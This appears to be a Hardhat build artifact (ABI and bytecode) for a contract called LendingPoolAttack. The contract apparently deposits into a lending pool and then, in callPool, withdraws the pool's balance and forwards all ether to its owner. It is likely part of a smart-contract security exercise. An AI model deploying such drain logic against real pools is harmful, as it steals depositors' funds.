{
  "_format": "hh-sol-artifact-1",
  "contractName": "LendingPoolAttack",
  "sourceName": "contracts/attacks/LendingPoolAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pool",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "callPool",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "execute",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "pool",
      "outputs": [
        {
          "internalType": "contract ILendingPool",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161032738038061032783398101604081905261002f91610062565b60008054336001600160a01b031991821617909155600180549091166001600160a01b0392909216919091179055610092565b60006020828403121561007457600080fd5b81516001600160a01b038116811461008b57600080fd5b9392505050565b610286806100a16000396000f3fe6080604052600436106100435760003560e01c806316f0115b1461004f578063614619541461008b5780637dab8544146100955780638da5cb5b146100aa57600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b5060015461006f906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6100936100ca565b005b3480156100a157600080fd5b50610093610135565b3480156100b657600080fd5b5060005461006f906001600160a01b031681565b600160009054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561011a57600080fd5b505af115801561012e573d6000803e3d6000fd5b5050505050565b6001546040517f9ab603b90000000000000000000000000000000000000000000000000000000081526001600160a01b039091168031600483015290639ab603b990602401600060405180830381600087803b15801561019457600080fd5b505af11580156101a8573d6000803e3d6000fd5b50505050600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101fc57600080fd5b505af1158015610210573d6000803e3d6000fd5b5050600080546040516001600160a01b0390911693504780156108fc02935091818181858888f1935050505015801561024d573d6000803e3d6000fd5b5056fea26469706673582212207390349d9ecff63e405a050e465c2a24049e48c4d86000cbdc42ea3ed93cda6464736f6c634300080c0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}